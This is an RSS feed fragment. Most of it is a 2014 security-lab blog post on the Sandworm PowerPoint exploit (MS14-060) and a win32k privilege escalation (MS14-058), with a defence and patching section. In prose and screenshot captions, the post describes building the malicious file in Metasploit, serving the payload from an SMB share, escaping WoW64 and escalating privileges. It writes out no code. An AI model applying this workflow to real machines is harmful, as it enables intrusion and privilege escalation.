&lt;p&gt;&lt;a href=&#34;https://googleonlinesecurity.blogspot.co.uk/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://googleonlinesecurity.blogspot.co.uk/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Playing with MS14-060 and MS14-058 [CVE-2014-4113 CVE-2014-4114] : Attacks and Defenses</title>
      <link>//localhost:1313/articles/2014/11/2014-11-10-playing-ms14-060-ms14-058-cve-2014-4113-cve-2014-4114-attacks-defenses/</link>
      <pubDate>Mon, 10 Nov 2014 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2014/11/2014-11-10-playing-ms14-060-ms14-058-cve-2014-4113-cve-2014-4114-attacks-defenses/</guid>
      <description>
        
        
        &lt;p&gt;Recently two 0-day exploits were revealed. The first one was given the name Sandworm, however, the name convention was mistakenly including the &amp;ldquo;worm&amp;rdquo; term as we will see. The second one CVE-2014-4113 is a privilege escalation local exploit for Windows. Sandworm as said includes the word  &amp;ldquo;worm&amp;rdquo; most likely for making the situation more dramatic. A worm is a self-propagating piece of code that does not take human intervention. It is said that Sandworm was used in cyber espionage operations from Russians against NATO, European Union, and also against specific industries such as the energy sector (by targeting SCADA systems). Vulnerable targets are Windows Office 2010 and 2013.  In order to have a successful attack, someone naive (or convinced!) to execute (open) a PowerPoint show file is needed. It is said that CVE 4113 strikes win32k.sys which is the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012, and allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014.  Win32k.sys is responsible for window management, and any GUI process/thread that will use it. Its related user-mode modules are user32.dll and GDI32.dll. Due to the complex interaction with user-mode applications, there are many problems in Win32k.sys. The exploit was acquired in the wild, and a hacking team called HURRICANE PANDA created it. A null pointer de-reference in win32k.sys is the vulnerability and by abusing the xxxSendMessageTimeout function it is possible to execute arbitrary code.&lt;/p&gt;
&lt;h2&gt;Attacking&lt;span class=&#34;absolute -mt-20&#34; id=&#34;attacking&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#attacking&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s see Sand worm initially&amp;hellip; In summary, the attack works as follows: a malicious PowerPoint show file is sent to the victim, the victim opens it, then the victim connects back to an attacker&amp;rsquo;s controlled host in order to fetch the payload and finally after downloading it, executes it. As it is easily spotted, this attack has many different factors in order to succeed. A single firewall blocking outgoing connections to SMB (Port 445) can stop the attack.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Attacker generates the malicious powerpoint file and sends the file to victim. Lets use the metasploit framework for that&amp;hellip;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_10&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;721&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/sandworm-options.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/sandworm-options.png&#34; alt=&#34;MS14-060 options&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; MS14-060 options[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_12&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;687&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/sandworm-options2.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/sandworm-options2.png&#34; alt=&#34;Adding the necessary stuff&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Adding the necessary stuff[/caption]&lt;/p&gt;
&lt;p&gt;Keep in mind to escape the &amp;ldquo;\&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_13&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;722&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/Sandworm-generation.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/Sandworm-generation.png&#34; alt=&#34;Generating the malicious ppsx&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Generating the malicious ppsx[/caption]&lt;/p&gt;
&lt;p&gt;As metasploit informs us, we have to place these files to a shared directory (with public/anonymous access). I had the issue that I was getting prompted for a password (after I was opening the ppsx file). It turns out that some latest versions of Windows are asking for a password even if the folder is publicly available. I changed to Linux world and everything worked fine!&lt;/p&gt;
&lt;p&gt;Now&amp;hellip; What are these 2 files&amp;hellip; First lets see the MtBe.gif file&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/sandworm-gif-executable.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/sandworm-gif-executable.png&#34; alt=&#34;sandworm gif executable&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And what about the aDPN.inf file?&lt;/p&gt;
&lt;p&gt;By the way, do you remember the famous autorun.inf files ? These files were responsible for what to be executed when we were plugging a CD-ROM, etc. INF files are also known as Setup Information files (check the wiki page!)&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_15&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;731&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/sandworm-renaming.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/sandworm-renaming.png&#34; alt=&#34;Aha! Renaming!&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Aha! Renaming![/caption]&lt;/p&gt;
&lt;p&gt;See the [RxRename] entry&amp;hellip; So what it does is that it renames the MtBe.gif file to MtBe.gif.exe file&amp;hellip; Why ? Obviously, because it will execute it afterward!&lt;/p&gt;
&lt;p&gt;We mount the remote shared dir and we place these 2 files there. We edit the output powerpoint file so it looks more innocent than the &amp;ldquo;Example / Example&amp;rdquo; of the default generation [ok I didnt.. but you get the point!] . After we send the file to the victim and we start our handler in metasploit. Patiently waiting&amp;hellip;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_16&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;1268&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/sweet.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/sweet.png&#34; alt=&#34;b00m&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; b00m[/caption]&lt;/p&gt;
&lt;p&gt;Now lets see our privileges&amp;hellip;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_17&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;896&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/blog-going-around-the-WoW64-by-migrating.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/blog-going-around-the-WoW64-by-migrating.png&#34; alt=&#34;Going around WoW64&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Going around WoW64[/caption]&lt;/p&gt;
&lt;p&gt;As we see here the current process is running in the Windows x32 on Windows x64 emulation. That means that if we try to launch a local exploit it will fail saying &amp;ldquo;Failure::NoTarget, &amp;ldquo;Running against &lt;em&gt;WOW64&lt;/em&gt; is &lt;em&gt;not supported&lt;/em&gt;&amp;rdquo;&amp;rdquo;. How to get around this? Easy&amp;hellip; We see the processes with &amp;ldquo;ps&amp;rdquo; and we migrate to a &amp;ldquo;native&amp;rdquo; x64 process.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_18&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;944&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/blog-going-around-the-WoW64-by-migrating2.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/blog-going-around-the-WoW64-by-migrating2.png&#34; alt=&#34;escaping WoW&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; escaping WoW[/caption]&lt;/p&gt;
&lt;p&gt;As you see in the picture above we successfully escaped WoW64 and now we can launch our local exploit.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;967&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/blogspot-2008-SP2-ms04-058-32bit.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/blogspot-2008-SP2-ms04-058-32bit.png&#34; alt=&#34;b00m&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; b00m[/caption]&lt;/p&gt;
&lt;h2&gt;Defending&lt;span class=&#34;absolute -mt-20&#34; id=&#34;defending&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#defending&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s take a look at the network activity during this. I will focus on the time that the ppsx file is opening (there is the juicy part ;))&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_20&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;693&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/analysis-.inf-file.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/analysis-.inf-file.png&#34; alt=&#34;INF file busted&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; INF file busted[/caption]&lt;/p&gt;
&lt;p&gt;Wireshark shows us that we have a SMB2 Read Response. Right after we see the request file for the .inf file. Hmmm lots of noise&amp;hellip;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_21&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;689&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/analysis-data-segments.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/analysis-data-segments.png&#34; alt=&#34;Downloading the files&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Downloading the files[/caption]&lt;/p&gt;
&lt;p&gt;Right after we see the downloading of the files&amp;hellip;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_22&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;713&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/analysis-data3.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/analysis-data3.png&#34; alt=&#34;And the closing of the files…&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; And the closing of the files&amp;hellip;[/caption]&lt;/p&gt;
&lt;p&gt;And finally the end of the files (notice also the .gif file here)&lt;/p&gt;
&lt;p&gt;What else we can see from Wireshark? Let&amp;rsquo;s follow the stream&amp;hellip;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_23&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;376&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2014/11/analysis-follow-the-stream.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/analysis-follow-the-stream.png&#34; alt=&#34;Following TCP Stream&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Following TCP Stream[/caption]&lt;/p&gt;
&lt;p&gt;Remember this line?&lt;/p&gt;
&lt;h2&gt;Solutions&lt;span class=&#34;absolute -mt-20&#34; id=&#34;solutions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#solutions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Solutions for these 2 vulnerabilities are patching. MS14-058 and MS14-060 are fixing the problems. Here I have to pinpoint that even if a host is vulnerable, by staying behind from a properly configured firewall will be still safe since it won&amp;rsquo;t be able to download the files. These types of malicious files are well known to malware analysts since they have assigned them as drive-by downloads. The name comes from the fact that at some point the victim host will try to fetch the payload and will execute it right after. From the host perspective in order to mitigate the risk, there are a couple of choices. Having signatures of the exploit itself could mitigate the exploitation. Also depending on the payload that it will be executed it could be picked up from the AV.&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
